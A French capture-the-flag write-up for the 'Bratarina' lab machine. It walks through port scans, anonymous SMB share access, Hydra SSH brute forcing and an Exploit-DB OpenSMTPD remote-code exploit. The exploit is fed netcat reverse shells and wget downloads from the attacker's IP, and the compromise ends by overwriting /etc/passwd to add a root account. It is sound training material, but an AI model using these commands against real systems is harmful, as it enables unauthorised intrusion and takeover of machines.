
# Bratarina

	sudo  masscan  -p1-65535,U:1-65535 192.168.158.71 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.158.71
	nmap -A -p22,25,53,80,445 192.168.158.71
	
Scans classiques.

    PORT STATE SERVICE VERSION  
    22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
    | ssh-hostkey:  
    | 2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)  
    | 256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)  
    |_ 256 d55b795bce48d85746db594fcd455def (ED25519)  
    25/tcp open smtp OpenSMTPD  
    | smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.160], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODE  
    S, SIZE 36700160, DSN, HELP  
    |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with fu  
    ll details 2.0.0 End of HELP info  
    53/tcp closed domain  
    80/tcp open http nginx 1.14.0 (Ubuntu)  
    |_http-server-header: nginx/1.14.0 (Ubuntu)  
    |_http-title: Page not found - FlaskBB  
    445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)

Scans complémentaires sur le SMB : 
	
	nmap  -sV  -sT  -p445  --script  "vuln and safe" 192.168.158.71 
    enum4linux  -a 192.168.158.71

Beaucoup d'éléments intéressants mais le plus important est que enum4linux a réussi à explorer le partage SMB sans credentials, on voit un partage //192.168.158.71/backups dans l'onglet "Share Enumeration"

On peut donc tenter de s'y connecter en anonyme pour l'explorer :

    smbclient -N //192.168.158.71/backups
    smb: \> ls
    smb: \> get passwd.bak
	
C'est juste un simple fichier /etc/passwd mais je me suis dit qu'il fallait peut-être tenter un bruteforcing sur les quelques noms du fichiers capables de se connecter, j'ai donc lancé Hydra en parallèle des recherches : 

    cat passwd.bak | grep -v nologin
	hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.158.71 ssh
	hydra -l neil -P /usr/share/wordlists/rockyou.txt 192.168.158.71 ssh

Sans succès, mais j'ai trouvé des exploits pour OpenSMTPD dont un de type CVE particulièrement intéressant : https://www.exploit-db.com/exploits/47984

    vim exploit_OpenSMTP.py
    python exploit_OpenSMTP.py 192.168.158.71 25 ls

L'exploit se déroule bien, mais je n'ai pas pu l'utiliser avec un reverse-shell. Aucun shell du site https://www.revshells.com/ n'a fonctionné alors que j'ai essayé sur plusieurs ports différents et dans plusieurs configurations différentes. Je me suis rabattu sur l'option de faire télécharger des fichiers à la cible mais là encore il y a eu beaucoup d'échecs.

Voici quelques exemples de commandes testées : 

	python3 exploit_OpenSMTP.py 192.168.158.71 25 'nc 192.168.45.160 9999 -e /bin/bash'
	python3 exploit_OpenSMTP.py 192.168.158.71 25 'wget 192.168.45.160/id_rsa -O /home/neil/.ssh/id_rsa'
	python3 exploit_OpenSMTP.py 192.168.158.71 25 'wget -O /tmp/nc2 192.168.45.160/nc_linux' ; chmod u+x /tmp/nc2 ; /tmp/nc2 192.168.45.160 9999 -e /bin/bash'
    
D'après mes logs Apache la phase de téléchargement fonctionne à chaque fois, c'est l'exécution de programmes qui semble poser problème. En revanche le trick du SSH semble ne pas fonctionner non plus. Il reste donc l'option de réécrire le fichier /etc/passwd, avec par exemple le fichier trouvé dans le FTP mais légérement modifié pour me créer un compte administrateur.

    openssl passwd -1 mdp123
    echo 'tim:$1$cNCh34ba$5KLgSZbxX0baUnEB66yoZ1:0:0:/root/:/bin/bash' >> passwd.bak
    sudo cp passwd.bak /var/www/html/
    python3 exploit_OpenSMTP.py 192.168.158.71 25 'wget 192.168.45.160/passwd.bak -O /etc/passwd'
    ssh tim@192.168.158.71
    ls /root
    cat /root/proof.txt

Attention, la commande "wget" semble parfois ne pas marcher quand on ajoute "http://" devant l'adresse IP !





